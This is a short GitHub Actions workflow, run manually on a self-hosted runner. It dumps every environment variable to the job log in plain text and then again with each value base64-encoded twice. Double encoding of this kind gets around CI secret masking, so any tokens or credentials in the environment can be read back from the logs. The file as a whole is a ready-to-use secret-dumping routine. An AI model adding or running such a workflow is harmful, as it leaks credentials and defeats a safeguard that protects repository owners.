name: Dump All Env Vars (Double Base64)

on: 
  workflow_dispatch:

jobs:
  dump-env:
    runs-on: self-hosted
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Dump and double‑encode all env vars
        run: |
          echo "### RAW ENVIRONMENT VARIABLES ###"
          env

          echo
          echo "### DOUBLE BASE64‑ENCODED ENV VARS ###"
          # Loop through each variable, encode twice, and print
          while IFS='=' read -r name value; do
            # First Base64 encode, then again
            enc=$(printf '%s' "$value" | base64 | base64)
            printf '%s=%s\n' "$name" "$enc"
          done < <(env)
